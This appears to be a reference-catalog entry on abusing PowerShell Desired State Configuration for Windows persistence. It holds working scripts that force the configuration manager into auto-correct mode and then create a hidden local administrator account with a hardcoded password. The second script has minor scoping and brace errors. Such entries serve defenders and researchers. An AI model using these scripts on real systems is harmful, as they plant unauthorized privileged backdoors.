## Desired State Configuration <!-- general "title" of the persistence. Good to be unique. -->

<!-- separate sections by two empty lines -->
<!-- do not remove empty sections  -->

### Location: <!-- where to find it -->

N/A[^1]

### Classification: <!-- see "how it works" document. Empty lime must go next. -->

| Criteria         | Value                    |
| :--------------- | :----------------------- |
| Permissions      | Admin                    |
| Security context | System                   |
| Persistence type | Other                    |
| Code type        | Files ; Other ; Fileless |
| Launch type      | Automatic                |
| Impact           | Non-destructive[^2]      |
| OS Version       | All OS versions          |
| Dependencies     | OS only[^3]              |
| Toolset          | Scriptable               |

### Description:<!-- add two EOLs or two spaces at the end of line to create a line break -->

Desired State Configuration (DSC) is a feature in PowerShell 4.0 and above that helps administrators to automate the configuration of Windows and Linux operating systems (OSes).  
DSC provides a set of PowerShell language extensions, cmdlets and a process called declarative scripting.  
Using DSC administrators can ensure that a machine is set to a specific configuration and that if it deviates from the configuration to run scripts that will restore the desired configuration.  
After setting a DSC extension the DSC Local Configuration Manager monitors the configuration and if any deviation is found, it can be fixed with DSC scripts running with system privileges.  
DSC can be run on a local or remote host the user has admin rights on, so it can be used for lateral movement as well.

To abuse DSC for persistence the first the Local Configuration Manager configuration might need be changed to a configuration that is auto-corrected if there is a deviation, to continue configuration after reboot and the Frequency of monitoring and changing should be set to the desired value (min 15 minutes).
this can be done with the following script:

```
#Change DSC Local Configuration Manager
[DSCLocalConfigurationManager()]
Configuration SetDSCLMConfig
{
    node localhost
    {
        Settings
        {
            ActionAfterReboot = 'ContinueConfiguration' #Might be already set
            AllowModuleOverWrite = $true
            ConfigurationMode = 'ApplyAndAutoCorrect'
            ConfigurationModeFrequencyMins = 15 #Change this
        }

    }
}
SetDSCLMConfig -OutputPath C:\foo\bar | Out-Null

#Setting the configuration manager
Set-DscLocalConfigurationManager -Path C:\foo\bar -ComputerName localhost

```

After setting the Local Configuration Manager the next step is to create a malicious configuration that suit our needs. Here is an example of a configuration that adds a user to local administrators and creates a file.

```
    Configuration NotMalicious
    {
        Node localhost
        {
            Script ScriptExample
            {
                SetScript = {
                    $username = "ITadmin"
                    $password = ConvertTo-SecureString "password123!!" -AsPlainText -Force
                    $exist = Get-LocalUser -Name $username -ErrorAction SilentlyContinue
                    if($exist -eq $null)
                    {
                        New-LocalUser -Name $username -Password $password -FullName "Real IT admin"
                        Add-LocalGroupMember -Group "Administrators" -Member $username
                    }
                    Write-Output "$(whoami) just added ITadmin" > C:\foo\bar\dsc.txt
                }
                TestScript = {
                    return ($exist -ne $null)
                }
                GetScript = { @{ Result = ($exist -ne $null) } }
            }
    }
    NotMalicious -OutputPath C:\foo\bar | Out-Null

    #Start the configuration
    Start-DscConfiguration -Path "C:\foo\bar" -ComputerName localhost | Out-Null
```

### References: <!-- use <...> or [abc](https://...) syntax. Prepend with "- " when more than one -->

[DSC Tutorial](https://learn.microsoft.com/en-us/powershell/dsc/getting-started/wingettingstarted?view=dsc-1.1)
[DSC Attack Framework](https://www.blackhat.com/docs/asia-16/materials/asia-16-Kazanciyan-DSCompromised-A-Windows-DSC-Attack-Framework.pdf)
[Azure DSC Persistence](https://www.netspi.com/blog/technical/cloud-penetration-testing/azure-persistence-with-desired-state-configurations/)
[DSC Community](https://github.com/dsccommunity)

### Credits: <!-- use [abc](https://...) syntax. Prepend with "- " when more than one. -->

- Entry added by [@Tamirye94](https://twitter.com/Tamirye94)

### See also: <!-- if refering to the same repo, use [Name](file.md) syntax. -->

<!-- prepend with "- " if more than one -->

### Remarks: <!-- see the usage in the "classification" section. Use only 1:1 references i.e. not refering to the same footnote from two different places -->

[^1]: Uses Microsoft DSC Local Configuration Manager.
[^2]: If a DSC configuration is already set, it will be overwritten.
[^3]: Requires WinRM to be enabled on the target machine
